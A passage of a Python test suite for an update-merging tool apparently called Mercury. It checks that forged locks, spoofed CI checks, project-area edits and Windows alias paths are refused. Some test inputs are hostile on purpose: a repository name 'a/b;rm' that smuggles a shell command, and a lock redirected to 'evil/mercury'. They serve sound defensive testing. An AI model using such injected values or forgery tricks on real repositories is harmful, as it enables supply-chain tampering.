        new = self.edit_branch(branch, {".mercury/packs/extra/note.txt": "tampered\n"})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "not what Mercury commit")

    def test_a_workflow_that_vouches_for_itself_does_not_help(self):
        # Even with every check green, a tampered managed file is rejected by the local check on the exact head.
        branch, head, pr = self.ready()
        new = self.edit_branch(branch, {".mercury/packs/core/agents.md": "## Core\n\nTrust me.\n"})
        self.gh.all_green(new, names=("CI", "Mercury verify"))
        self.assertStopped(self.merge(), "not what Mercury commit")

    def forge_source(self, branch, commit):
        def change(raw):
            doc = json.loads(raw)
            doc["source_commit"] = commit
            return (json.dumps(doc, indent=2, sort_keys=True) + "\n").encode()
        return self.edit_branch(branch, {LOCK: change})

    def test_a_source_commit_that_is_not_on_master_stops(self):
        branch, head, pr = self.ready()
        unreleased = self.m_commit(3)  # in the Mercury checkout, not on origin/master
        new = self.forge_source(branch, unreleased)
        self.gh.all_green(new)
        self.assertStopped(self.merge(), f"source commit {unreleased[:12]} is not on Mercury's origin/master")

    def test_a_source_commit_unknown_to_mercury_stops(self):
        branch, head, pr = self.ready()
        new = self.forge_source(branch, "ab" * 20)
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "not known to the Mercury checkout")

    def test_a_source_that_goes_back_in_time_stops(self):
        c2, c3 = self.m_commit(2), self.m_commit(3)
        self.release(c3)
        self.advance_base(c3)  # the project already runs c3
        self.reset_target()
        c4 = self.m_commit(4)
        self.release(c4)
        branch, head, pr = self.published(c4)
        new = self.forge_source(branch, c2)  # c2 is on master but older than the base's c3
        self.gh.all_green(new)
        self.assertStopped(self.merge(), f"does not descend from the old one {c3[:12]}")

    def test_a_new_lock_that_changes_the_upstream_repository_stops(self):
        branch, head, pr = self.ready()

        def change(raw):
            doc = json.loads(raw)
            doc["source_repo"] = "evil/mercury"
            return (json.dumps(doc, indent=2, sort_keys=True) + "\n").encode()
        new = self.edit_branch(branch, {LOCK: change})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "source_repo changed")

    def test_a_head_without_a_lock_stops(self):
        branch, head, pr = self.ready()
        new = self.edit_branch(branch, {LOCK: None})
        self.gh.all_green(new)
        self.assertStopped(self.merge(), "has no .mercury/lock.json")

    def test_checks_missing_pending_failed_or_skipped_stop(self):
        branch, head, pr = self.ready()
        cases = {
            "missing project check": ({"Mercury verify": ("completed", "success")}, "check 'CI' has not been reported"),
            "missing mercury check": ({"CI": ("completed", "success")}, "check 'Mercury verify' has not been reported"),
            "pending": ({"CI": ("in_progress", None), "Mercury verify": ("completed", "success")}, "check run is in_progress"),
            "queued": ({"CI": ("queued", None), "Mercury verify": ("completed", "success")}, "check run is queued"),
            "failed": ({"CI": ("completed", "failure"), "Mercury verify": ("completed", "success")}, "(failure)"),
            "skipped": ({"CI": ("completed", "skipped"), "Mercury verify": ("completed", "success")}, "(skipped)"),
            "neutral": ({"CI": ("completed", "neutral"), "Mercury verify": ("completed", "success")}, "(neutral)"),
            "cancelled": ({"CI": ("completed", "cancelled"), "Mercury verify": ("completed", "success")}, "(cancelled)"),
            "none at all": ({}, "has not been reported"),
        }
        for label, (checks, text) in cases.items():
            with self.subTest(label):
                self.gh.set_checks(head, checks)
                self.assertStopped(self.merge(), text)

    def test_a_status_named_mercury_verify_cannot_stand_in_for_the_check_run(self):
        branch, head, pr = self.ready()
        self.gh.set_checks(head, {"CI": ("completed", "success")})
        self.gh.statuses[head] = [{"id": 1, "context": "Mercury verify", "state": "success"}]
        self.assertStopped(self.merge(), "'Mercury verify' has not been reported on this commit by the github-actions app")

    def test_a_mercury_verify_run_of_another_app_does_not_count(self):
        branch, head, pr = self.ready()
        self.gh.set_checks(head, {"CI": ("completed", "success"), "Mercury verify": ("completed", "success", "some-other-app")})
        self.assertStopped(self.merge(), "by the github-actions app")

    def test_only_the_actions_run_decides_even_when_another_app_posts_a_green_one(self):
        branch, head, pr = self.ready()
        self.gh.runs[head] = [
            {"id": 1, "name": "CI", "status": "completed", "conclusion": "success", "app": {"slug": "x"}},
            {"id": 2, "name": "Mercury verify", "status": "completed", "conclusion": "failure", "app": {"slug": "github-actions"}},
            {"id": 3, "name": "Mercury verify", "status": "completed", "conclusion": "success", "app": {"slug": "some-other-app"}}]
        self.assertStopped(self.merge(), "check 'Mercury verify': check run is completed (failure)")

    def test_the_projects_own_required_checks_may_come_from_any_app_or_a_status(self):
        branch, head, pr = self.ready()
        self.gh.set_checks(head, {"Mercury verify": ("completed", "success"), "CI": ("completed", "success", "external-ci")})
        self.assertEqual(self.merge()[0], 0)
        self.gh.prs[0]["state"] = "open"
        self.gh.set_checks(head, {"Mercury verify": ("completed", "success")})
        self.gh.statuses[head] = [{"id": 1, "context": "CI", "state": "success"}]
        self.assertEqual(self.merge()[0], 0)

    def test_a_run_without_app_information_is_not_trusted_as_mercury_verify(self):
        branch, head, pr = self.ready()
        self.gh.runs[head] = [{"id": 1, "name": "CI", "status": "completed", "conclusion": "success"},
                              {"id": 2, "name": "Mercury verify", "status": "completed", "conclusion": "success"}]
        self.assertStopped(self.merge(), "by the github-actions app")

    def test_a_pull_request_number_must_be_a_positive_integer(self):
        for bad in ("7", True, 0, -1, None, 1.5):
            with self.subTest(bad=bad):
                self.gh.prs.clear()
                pr = self.gh.add_pr("mercury/update-aaaaaaaaaaaa")
                pr["number"] = bad
                self.assertStopped(self.merge(), "no valid number", code=2)

    def test_checks_on_another_commit_do_not_count(self):
        branch, head, pr = self.ready()
        self.gh.runs.clear()
        self.gh.all_green("0" * 40)
        self.assertStopped(self.merge(), "has not been reported")

    def test_a_success_status_counts_and_a_failing_one_does_not(self):
        branch, head, pr = self.ready()
        self.gh.set_checks(head, {"Mercury verify": ("completed", "success")})
        self.gh.statuses[head] = [{"id": 2, "context": "CI", "state": "success"}, {"id": 1, "context": "CI", "state": "failure"}]
        self.assertEqual(self.merge()[0], 0)  # the newest status of a context decides

    def test_a_newest_failing_status_stops(self):
        branch, head, pr = self.ready()
        self.gh.statuses[head] = [{"id": 2, "context": "CI", "state": "pending"}, {"id": 1, "context": "CI", "state": "success"}]
        self.assertStopped(self.merge(), "status is pending")

    def test_a_failing_run_with_the_same_name_as_a_success_stops(self):
        branch, head, pr = self.ready()
        self.gh.runs[head].append({"id": 99, "name": "CI", "status": "completed", "conclusion": "failure", "app": {"slug": "x"}})
        self.assertStopped(self.merge(), "check 'CI'")

    def test_incomplete_check_pagination_is_a_refusal(self):
        branch, head, pr = self.ready()
        self.gh.total_override[head] = 250  # GitHub says 250 runs exist, only 2 can be read
        self.assertStopped(self.merge(), "read 2 of 250", code=2)
        saved = U.PER_PAGE, U.MAX_PAGES
        self.addCleanup(lambda: (setattr(U, "PER_PAGE", saved[0]), setattr(U, "MAX_PAGES", saved[1])))
        self.gh.total_override.clear()
        self.gh.runs[head] = [{"id": i, "name": f"x{i}", "status": "completed", "conclusion": "success", "app": {"slug": "x"}} for i in range(7)] \
            + self.gh.runs[head]
        U.PER_PAGE, U.MAX_PAGES = 2, 2
        self.assertStopped(self.merge(), "more than", code=2)

    def test_incomplete_pull_request_pagination_is_a_refusal(self):
        self.ready()
        saved = U.PER_PAGE, U.MAX_PAGES
        self.addCleanup(lambda: (setattr(U, "PER_PAGE", saved[0]), setattr(U, "MAX_PAGES", saved[1])))
        for i in range(6):
            self.gh.add_pr(f"feature/f{i}")
        U.PER_PAGE, U.MAX_PAGES = 2, 2
        self.assertStopped(self.merge(), "more than", code=2)

    def test_draft_closed_and_not_yet_mergeable_pull_requests_stop(self):
        branch, head, pr = self.ready()
        pr["draft"] = True
        self.assertStopped(self.merge(), "draft")
        pr["draft"] = False
        pr["mergeable"] = None
        self.assertStopped(self.merge(), "has not computed whether it is mergeable yet")
        pr["mergeable"] = False
        self.assertStopped(self.merge(), f"conflicts with {BASE} and cannot be merged. Close it and delete its branch {branch}")

    def test_a_head_that_moves_during_verification_stops(self):
        branch, head, pr = self.ready()
        pr["sha"] = "0" * 40  # GitHub reports a head the remote branch does not have (or the branch moved after the list)
        self.assertStopped(self.merge(), "moved while")

    def test_a_config_that_names_another_integration_branch_is_refused(self):
        self.ready()
        cfg = lambda raw: raw.replace(b'"develop"', b'"main"')
        self.edit_branch(BASE, {CONFIG: cfg})
        self.assertStopped(self.merge(), "integration_branch", code=2)

    def test_a_failure_from_gh_is_not_swallowed(self):
        self.ready()
        self.gh.fail_on = "merge"
        rc, out, err = self.merge()
        self.assertEqual(rc, 2)
        self.assertNotIn(SECRET, out + err)


class ProjectArea(Fixture):
    """#692: an update pull request never touches the project area (manifest, sources, the outputs the lock's `local`
    section records, or that section). An update of the packs alone still goes through."""
    LOCAL = ".mercury/local.json"
    ROLE_SRC = ".mercury/local/roles/proj-role.md"

    def setUp(self):
        super().setUp()
        write(self.target / self.ROLE_SRC, DEV_ROLE.replace("Builds things.", "Project role."))
        write(self.target / "s/proj-x/SKILL.md", "---\nname: proj-x\ndescription: Project skill.\n---\n\nbody\n")
        write(self.target / self.LOCAL, json.dumps({"schema_version": 1, "roles": {"proj-role": self.ROLE_SRC},
                                                    "skills": {"proj-x": {"path": "s/proj-x", "hosts": ["claude"]}}}))
        self.mercury_tool("apply", self.c1)
        git(self.target, "add", "-A")
        git(self.target, "commit", "-q", "-m", "project area")
        git(self.target, "push", "-q", "origin", BASE)
        self.assertIn("local", json.loads((self.target / LOCK).read_text(encoding="utf-8")))

    def ready(self):
        branch, head, pr = self.published()
        self.gh.all_green(head)
        return branch, head, pr

    def test_an_update_of_the_packs_with_a_project_area_merges(self):
        branch, head, pr = self.ready()
        changed = git(self.bare, "diff", "--name-only", BASE, branch).split()
        self.assertFalse([c for c in changed if "proj-" in c or c.startswith(".mercury/local")], changed)
        rc, out, err = self.merge()
        self.assertEqual(rc, 0, out + err)

    def test_changes_to_the_project_area_are_refused(self):
        def relocal(raw):
            doc = json.loads(raw)
            doc["local"]["files"][".claude/agents/proj-role.md"] = "0" * 64
            return (json.dumps(doc, indent=2, sort_keys=True) + "\n").encode()
        cases = {
            self.LOCAL: (lambda b: b + b" ", "belongs to the project area"),
            self.ROLE_SRC: (lambda b: b + b"more\n", "belongs to the project area"),
            ".mercury/local/notes.md": ("new\n", "belongs to the project area"),
            ".claude/agents/proj-role.md": (lambda b: b + b"x\n", "belongs to the project area"),
            ".codex/agents/proj-role.toml": (None, "belongs to the project area"),
            ".claude/skills/proj-x/SKILL.md": (lambda b: b + b"x\n", "belongs to the project area"),
            "s/proj-x/SKILL.md": (lambda b: b + b"x\n", "belongs to the project area"),
            LOCK: (relocal, "the local section (project area) must not change"),
        }
        for n, (rel, (change, text)) in enumerate(cases.items(), 2):
            with self.subTest(rel=rel):
                self.gh = FakeGh(self.bare)
                for b in self.remote_branches():
                    if b.startswith("mercury/"):
                        git(self.bare, "update-ref", "-d", f"refs/heads/{b}")
                self.reset_target()
                branch, head, pr = self.published(self.m_commit(n))
                new = self.edit_branch(branch, {rel: change})
                self.gh.all_green(new)
                rc, out, err = self.merge()
                self.assertEqual(rc, 1, out + err)
                self.assertIn(text, err)
                self.assertEqual(self.gh.named("pr", "merge"), [])
                rc, out, err = self.run_tool("verify", "--head-ref", branch) if self.checkout(new) else (None, "", "")
                self.assertEqual(rc, 1, out + err)
                self.assertIn(text, err)

    def index_path_on_branch(self, branch, rel, content="x\n"):
        """Commit a file at exactly `rel` through the index, so a spelling the file system would fold (case, trailing dot)
        reaches the commit as written."""
        work = self.tmp / f"work-{len(list(self.tmp.glob('work-*')))}"
        git(self.tmp, "clone", "-q", "--branch", branch, str(self.bare), str(work))
        blob = subprocess.run(["git", "-C", str(work), "hash-object", "-w", "--stdin"], input=content, capture_output=True,
                              text=True, check=True).stdout.strip()
        git(work, "-c", "core.protectNTFS=false", "update-index", "--add", "--cacheinfo", f"100644,{blob},{rel}")
        git(work, "commit", "-q", "-m", "alias")
        git(work, "push", "-q", "origin", f"HEAD:refs/heads/{branch}")
        return git(work, "rev-parse", "HEAD")

    def test_alias_spellings_of_the_project_area_are_refused(self):
        # On Windows these spellings are the project area itself: case-folded, or with a trailing dot that Windows drops.
        aliases = (".Mercury/Local/x.md", ".MERCURY/local.JSON", ".mercury/local./x.md", ".mercury./local/roles/x.md",
                   ".mercury/local.json.", ".Claude/Agents/proj-role.md", ".codex/agents/proj-role.toml.")
        for n, rel in enumerate(aliases, 2):
            with self.subTest(rel=rel):
                self.gh = FakeGh(self.bare)
                for b in self.remote_branches():
                    if b.startswith("mercury/"):
                        git(self.bare, "update-ref", "-d", f"refs/heads/{b}")
                self.reset_target()
                branch, head, pr = self.published(self.m_commit(n))
                new = self.index_path_on_branch(branch, rel)
                self.assertIn(rel, git(self.bare, "ls-tree", "-r", "--name-only", new))  # the alias really is in the commit
                self.gh.all_green(new)
                rc, out, err = self.merge()
                self.assertEqual(rc, 1, out + err)
                self.assertIn(f"{rel}: belongs to the project area", err)
                self.assertEqual(self.gh.named("pr", "merge"), [])

    def checkout(self, sha):
        git(self.target, "fetch", "-q", "origin", f"+refs/heads/*:refs/remotes/origin/*")
        git(self.target, "switch", "-q", "--detach", sha)
        return True


class Verify(Fixture):
    def run_verify(self, head_ref):
        return self.run_tool("verify", "--head-ref", head_ref)

    def test_an_ordinary_branch_is_not_verified_here(self):
        rc, out, err = self.run_verify("feature/x")
        self.assertEqual((rc, "nothing to verify" in out), (0, True))

    def test_a_good_update_head_passes(self):
        branch, head, pr = self.published()
        git(self.target, "switch", "-q", "--detach", head)
        rc, out, err = self.run_verify(branch)
        self.assertEqual(rc, 0, out + err)

    def test_verify_makes_no_github_call_and_writes_nothing(self):
        branch, head, pr = self.published()
        git(self.target, "switch", "-q", "--detach", head)
        before = git(self.target, "status", "--porcelain=v1", "--ignored")
        self.gh.calls.clear()
        self.assertEqual(self.run_verify(branch)[0], 0)
        self.assertEqual((self.gh.calls, git(self.target, "status", "--porcelain=v1", "--ignored")), ([], before))

    def test_a_bad_update_head_fails(self):
        branch, head, pr = self.published()
        new = self.edit_branch(branch, {"src/app.py": "x\n"})
        git(self.target, "fetch", "-q", "origin", branch)
        git(self.target, "switch", "-q", "--detach", new)
        rc, out, err = self.run_verify(branch)
        self.assertEqual(rc, 1, out + err)
        self.assertIn("src/app.py: not a Mercury-managed path", err)

    def test_an_update_branch_name_of_the_wrong_shape_fails(self):
        rc, out, err = self.run_verify("mercury/update-zzz")
        self.assertEqual(rc, 1, out + err)


class CommandLine(unittest.TestCase):
    def run_cli(self, *args):
        r = subprocess.run([sys.executable, "-B", str(TOOL), *args], capture_output=True, text=True, encoding="utf-8")
        return r.returncode, r.stdout + r.stderr

    # The argument lists the released workflows use. An older copy of the managed workflow may call the newest tool, so these
    # must keep parsing, and no subcommand may ever require an option that is not on this list.
    RELEASED = {
        "publish": ["--target", "--mercury", "--repo", "--base"],
        "merge": ["--target", "--mercury", "--repo", "--base"],  # --required-checks-json is optional
        "verify": ["--target", "--mercury", "--base", "--head-ref"],
    }

    def test_released_command_lines_still_parse_and_no_new_option_is_required(self):
        ap = U.build_parser()
        choices = ap._subparsers._group_actions[0].choices
        self.assertEqual(set(choices), set(self.RELEASED))
        for name, sub in choices.items():
            required = sorted(o for a in sub._actions if a.required for o in a.option_strings[:1])
            self.assertEqual(required, sorted(self.RELEASED[name]), f"{name}: the set of required options changed")
        for argv in (["publish", "--target", "t", "--mercury", "m", "--repo", "o/r", "--base", "develop"],
                     ["merge", "--target", "t", "--mercury", "m", "--repo", "o/r", "--base", "develop"],
                     ["merge", "--target", "t", "--mercury", "m", "--repo", "o/r", "--base", "develop", "--required-checks-json", "[]"],
                     ["verify", "--target", "t", "--mercury", "m", "--base", "develop", "--head-ref", "x"]):
            ap.parse_args(argv)

    def test_usage_errors_exit_2(self):
        self.assertEqual(self.run_cli()[0], 2)
        self.assertEqual(self.run_cli("publish")[0], 2)
        self.assertEqual(self.run_cli("merge", "--target", "x", "--mercury", "y", "--base", "main")[0], 2)  # no --repo
        self.assertEqual(self.run_cli("nonsense")[0], 2)

    def test_a_bad_repo_or_branch_or_directory_is_a_safety_error(self):
        tmp = tempfile.mkdtemp()
        self.addCleanup(lambda: os.rmdir(tmp))
        for repo in ("nope", "a/b/c", "a/b;rm", "-x/y", "a b/c"):
            with self.subTest(repo=repo):
                rc, out = self.run_cli("merge", "--target", tmp, "--mercury", tmp, "--base", "main", f"--repo={repo}")
                self.assertEqual((rc, "owner/name" in out), (2, True))
        for base in ("a..b", "-x", "mercury/update-aaaaaaaaaaaa", "a b"):
            with self.subTest(base=base):
                rc, out = self.run_cli("merge", "--target", tmp, "--mercury", tmp, f"--base={base}", "--repo", REPO)
                self.assertEqual(rc, 2, out)
        rc, out = self.run_cli("merge", "--target", os.path.join(tmp, "missing"), "--mercury", tmp, "--base", "main", "--repo", REPO)
        self.assertEqual(rc, 2, out)


if __name__ == "__main__":
    unittest.main()
